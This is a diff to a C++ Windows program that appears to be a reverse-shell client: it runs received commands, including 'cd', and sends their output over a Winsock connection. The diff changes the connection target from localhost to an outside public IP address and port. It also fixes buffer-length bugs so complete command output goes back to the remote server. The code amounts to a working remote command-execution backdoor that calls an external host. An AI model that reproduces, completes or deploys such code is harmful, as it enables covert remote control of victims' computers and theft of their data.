@@ -27,7 +27,7 @@ std::tuple<string, string> execute(const std::string& command) {
 		cd.erase(0, 3);
 		cout << "cd \n" << cd;
 		_chdir(cd.c_str());
-		return make_tuple("cd", "");
+		return make_tuple("cd \n", "");
 	}
 	else{
 		char* buf = nullptr;
@@ -61,8 +61,10 @@ int main()
     cout << "Hello World!\n";
 
    
-	string ip = "127.0.0.1";
+	string ip = "193.161.193.99";
+	int port = 44313;
 
+	int buffer = 256;
 
 
 	// initialze winsock
@@ -91,7 +93,7 @@ int main()
 
 	sockaddr_in hint;
 	hint.sin_family = AF_INET;
-	hint.sin_port = htons(4422);
+	hint.sin_port = htons(port);
 	inet_pton(AF_INET, ip.c_str(), &hint.sin_addr);
 
 	// connect to server
@@ -156,19 +158,19 @@ int main()
 		strncpy_s(tab2, output.c_str(), sizeof(tab2));
 		tab2[sizeof(tab2) - 1] = 0;
 
-		i = sizeof(output.length());
+		i = output.length();
 		cout << i;
 		char converted_number[8];
 
 		sprintf_s(converted_number, "%d", i);
 
-		cout << "converted_number " << converted_number;
+	
 		send(sock, converted_number, 8, 0);
 
 		char temp_buf[8];
 		recv(sock, temp_buf, 8, 0);
 
-		send(sock, tab2, sizeof(tab2), 0);
+		send(sock, tab2, i + 1, 0);
 
 	}
 
